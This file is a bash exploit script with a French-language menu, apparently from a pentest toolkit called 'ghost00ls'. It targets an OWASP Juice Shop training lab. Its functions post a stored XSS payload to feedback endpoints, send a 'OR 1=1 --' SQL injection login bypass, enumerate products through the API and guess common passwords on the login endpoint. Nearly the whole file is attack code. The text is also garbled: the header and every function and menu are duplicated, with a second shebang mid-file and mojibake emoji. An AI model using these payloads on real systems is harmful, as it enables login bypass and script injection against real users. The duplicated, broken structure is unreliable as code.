#!/bin/bash
# exploits.sh - Juice Shop exploits (formatted like DVWA's exploits.sh)
# Place in: ~/ghost00ls/modules/labs/juice_shop/exploits/exploits.sh
# WARNING: Run only against your local Juice Shop lab or authorized targets.

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ------------------------- Utilities ----------------------------------------
get_host_ip() {
    ip=$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { print $i; exit }}')
    echo "${ip:-127.0.0.1}"
}

urlenc() {
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
    else
        echo -n "$1" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/"/%22/g' -e "s/'/%27/g"
    fi
}

# ------------------------- Tool management ----------------------------------
declare -A ATTACK_TOOLS=(
    [hydra]=hydra
    [sqlmap]=sqlmap
    [ffuf]=ffuf
    [curl]=curl
    [jq]=jq
)

install_tool() {
    case "$1" in
        hydra) sudo apt update && sudo apt install -y hydra ;; 
        sqlmap) sudo apt update && sudo apt install -y sqlmap ;; 
        ffuf) sudo apt update && sudo apt install -y ffuf ;; 
        curl) sudo apt update && sudo apt install -y curl ;; 
        jq) sudo apt update && sudo apt install -y jq ;; 
        *) echo "install_tool: inconnu: $1" ;; 
    esac
}

check_tools() {
    local missing=0
    for t in "$@"; do
        if ! command -v "$t" &>/dev/null; then
            echo -e "${YELLOW}‚ö†Ô∏è $t manquant ‚Üí tentative d'installation...${NC}"
            install_tool "$t"
            missing=$((missing+1))
        else
            echo -e "${GREEN}‚úîÔ∏è $t OK${NC}"
        fi
    done
    [[ $missing -eq 0 ]] && echo -e "${GREEN}‚úÖ Tous les outils pr√™ts${NC}
"
}

# ------------------------- Juice Shop specific exploits ---------------------
#!/bin/bash
# exploits.sh - Juice Shop exploits (formatted like DVWA's exploits.sh)
# Place in: ~/ghost00ls/modules/labs/juice_shop/exploits/exploits.sh
# WARNING: Run only against your local Juice Shop lab or authorized targets.

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ------------------------- Utilities ----------------------------------------
get_host_ip() {
    ip=$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { print $i; exit }}')
    echo "${ip:-127.0.0.1}"
}

urlenc() {
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
    else
        echo -n "$1" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/"/%22/g' -e "s/'/%27/g"
    fi
}

# ------------------------- Tool management ----------------------------------
declare -A ATTACK_TOOLS=(
    [hydra]=hydra
    [sqlmap]=sqlmap
    [ffuf]=ffuf
    [curl]=curl
    [jq]=jq
)

install_tool() {
    case "$1" in
        hydra) sudo apt update && sudo apt install -y hydra ;; 
        sqlmap) sudo apt update && sudo apt install -y sqlmap ;; 
        ffuf) sudo apt update && sudo apt install -y ffuf ;; 
        curl) sudo apt update && sudo apt install -y curl ;; 
        jq) sudo apt update && sudo apt install -y jq ;; 
        *) echo "install_tool: inconnu: $1" ;; 
    esac
}

check_tools() {
    local missing=0
    for t in "$@"; do
        if ! command -v "$t" &>/dev/null; then
            echo -e "${YELLOW}‚ö†Ô∏è $t manquant ‚Üí tentative d'installation...${NC}"
            install_tool "$t"
            missing=$((missing+1))
        else
            echo -e "${GREEN}‚úîÔ∏è $t OK${NC}"
        fi
    done
    [[ $missing -eq 0 ]] && echo -e "${GREEN}‚úÖ Tous les outils pr√™ts${NC}
"
}

# ------------------------- Juice Shop specific exploits ---------------------
exploit_xss_feedback() {
  clear; banner
  echo -e "${MAGENTA}üß™ [Juice Shop - XSS via Feedbacks (robust)]${NC}"
  DEFAULT_IP=$(get_host_ip)
  read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
  read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
  BASE="http://$IP:$PORT"

  PAYLOAD="<script>alert('JUICE_XSS')</script>"

  endpoints=( \
    "/rest/Feedbacks" \
    "/rest/feedbacks" \
    "/rest/Feedback" \
    "/rest/feedback" \
    "/api/Feedbacks" \
    "/api/feedbacks" \
    "/rest/public/Feedbacks" \
    "/rest/public/feedbacks" \
    "/api/Feedback" \
  )

  for ep in "${endpoints[@]}"; do
    url="${BASE}${ep}"
    echo -e "${YELLOW}‚ñ∂ Testing POST ${url}${NC}"
    tmpf=$(mktemp)
    http_code=$(curl -s -w "%{http_code}" -o "$tmpf" -X POST "$url" \
      -H 'Content-Type: application/json' \
      -d "{\"message\":\"$PAYLOAD\",\"name\":\"poc\",\"email\":\"poc@example.invalid\"}")
    echo -e "${CYAN}HTTP code: $http_code${NC}"
    echo "----- body preview -----"
    sed -n '1,60p' "$tmpf"
    firstchar=$(sed -n '1,1p' "$tmpf" | sed 's/^[[:space:]]*//g' | cut -c1 || true)
    if [[ "$firstchar" == "{" || "$firstchar" == "[" ]]; then
      echo -e "${GREEN}‚Üí JSON response (formatting with jq):${NC}"
      cat "$tmpf" | jq . 2>/dev/null || echo "jq could not parse"
    else
      echo -e "${YELLOW}‚Üí Non-JSON response (likely HTML/text).${NC}"
    fi
    echo "-------------------------"
    rm -f "$tmpf"

    if [[ "$http_code" =~ ^2|^3 ]]; then
      echo -e "${GREEN}‚úÖ Endpoint accepting request: $url (HTTP $http_code)${NC}"
      break
    fi
  done

  echo -e "${GREEN}‚úÖ Tests termin√©s ‚Äî v√©rifie l'UI /#/feedbacks ou le endpoint identifi√©${NC}"
  read -p "üëâ Entr√©e pour revenir..."
}

exploit_sqli_login() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - SQLi on login (basic)]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ Trying classic SQLi payload against /rest/user/login${NC}"
    curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
        -d '{"email":"\" OR 1=1 --","password":"x"}' | jq '.' || true
    echo -e "${GREEN}‚úÖ Done ‚Äî check response for tokens or error messages${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_enum_products() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Enum Products via API]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ GET $TARGET/rest/products?filter=all${NC}"
    curl -s "$TARGET/rest/products?filter=all" | jq '. | {count: length, sample: .[0]}'
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_weak_passwords() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Weak passwords quick test]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    read -p "üë§ User email to test (default: admin@juice.local): " USER; USER=${USER:-admin@juice.local}
    PWLIST=(password 123456 admin qwerty letmein)

    for p in "${PWLIST[@]}"; do
        echo -e "${YELLOW}‚ñ∂ Trying $USER:$p${NC}"
        resp=$(curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' -d "{\"email\": \"$USER\", \"password\": \"$p\"}") || resp=""
        echo "$resp" | jq '.' || echo "$resp"
        sleep 1
    done
    echo -e "${GREEN}‚úÖ Done ‚Äî use responsibly${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_csrf_like_admin() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - CSRF-like admin action simulation]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ This function demonstrates creating a forged request to admin endpoints (example).${NC}"
    echo -e "${YELLOW}‚ñ∂ Modify to fit your lab's admin endpoints. No destructive defaults included.${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

create_example_exploit() {
    mkdir -p "$LOG_DIR/examples"
    cat > "$LOG_DIR/examples/juice_example.sh" <<'EOF'
#!/usr/bin/env bash
# example: list categories
URL=${1:-http://127.0.0.1:3000}
curl -s "$URL/rest/products?filter=all" | jq '.'
EOF
    chmod +x "$LOG_DIR/examples/juice_example.sh"
    echo -e "${GREEN}‚úÖ Example created: $LOG_DIR/examples/juice_example.sh${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

# ------------------------- Menu (DVWA-style) --------------------------------
menu_exploits() {
    clear; banner
    echo -e "${CYAN}=== üí£ Exemples d‚Äôexploitation Juice Shop (Ghost00ls) ===${NC}"
    echo "1) XSS via Feedbacks"
    echo "2) SQL Injection (login)"
    echo "3) Enum products (API)"
    echo "4) Weak passwords (quick)"
    echo "5) CSRF-like admin simulation"
    echo "6) Create example exploit script"
    echo "0) Quit"
    echo
    read -p "üëâ Choix : " choice

    case $choice in
        1) exploit_xss_feedback ;;
        2) exploit_sqli_login ;;
        3) exploit_enum_products ;;
        4) exploit_weak_passwords ;;
        5) exploit_csrf_like_admin ;;
        6) create_example_exploit ;;
        0) return ;;
        *) echo -e "${RED}‚ùå Option invalide${NC}" ;;
    esac
    menu_exploits
}

menu_exploits


exploit_sqli_login() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - SQLi on login (basic)]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ Trying classic SQLi payload against /rest/user/login${NC}"
    curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
        -d '{"email":"\" OR 1=1 --","password":"x"}' | jq '.' || true
    echo -e "${GREEN}‚úÖ Done ‚Äî check response for tokens or error messages${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_enum_products() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Enum Products via API]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ GET $TARGET/rest/products?filter=all${NC}"
    curl -s "$TARGET/rest/products?filter=all" | jq '. | {count: length, sample: .[0]}'
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_weak_passwords() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Weak passwords quick test]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    read -p "üë§ User email to test (default: admin@juice.local): " USER; USER=${USER:-admin@juice.local}
    PWLIST=(password 123456 admin qwerty letmein)

    for p in "${PWLIST[@]}"; do
        echo -e "${YELLOW}‚ñ∂ Trying $USER:$p${NC}"
        resp=$(curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' -d "{\"email\": \"$USER\", \"password\": \"$p\"}") || resp=""
        echo "$resp" | jq '.' || echo "$resp"
        sleep 1
    done
    echo -e "${GREEN}‚úÖ Done ‚Äî use responsibly${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_csrf_like_admin() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Juice Shop - CSRF-like admin action simulation]${NC}"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê Host/IP (${DEFAULT_IP}): " IP; IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    TARGET="http://$IP:$PORT"

    echo -e "${YELLOW}‚ñ∂ This function demonstrates creating a forged request to admin endpoints (example).${NC}"
    echo -e "${YELLOW}‚ñ∂ Modify to fit your lab's admin endpoints. No destructive defaults included.${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

create_example_exploit() {
    mkdir -p "$LOG_DIR/examples"
    cat > "$LOG_DIR/examples/juice_example.sh" <<'EOF'
#!/usr/bin/env bash
# example: list categories
URL=${1:-http://127.0.0.1:3000}
curl -s "$URL/rest/products?filter=all" | jq '.'
EOF
    chmod +x "$LOG_DIR/examples/juice_example.sh"
    echo -e "${GREEN}‚úÖ Example created: $LOG_DIR/examples/juice_example.sh${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

# ------------------------- Menu (DVWA-style) --------------------------------
menu_exploits() {
    clear; banner
    echo -e "${CYAN}=== üí£ Exemples d‚Äôexploitation Juice Shop (Ghost00ls) ===${NC}"
    echo "1) XSS via Feedbacks"
    echo "2) SQL Injection (login)"
    echo "3) Enum products (API)"
    echo "4) Weak passwords (quick)"
    echo "5) CSRF-like admin simulation"
    echo "6) Create example exploit script"
    echo "0) Quit"
    echo
    read -p "üëâ Choix : " choice

    case $choice in
        1) exploit_xss_feedback ;;
        2) exploit_sqli_login ;;
        3) exploit_enum_products ;;
        4) exploit_weak_passwords ;;
        5) exploit_csrf_like_admin ;;
        6) create_example_exploit ;;
        0) return ;;
        *) echo -e "${RED}‚ùå Option invalide${NC}" ;;
    esac
    menu_exploits
}

menu_exploits
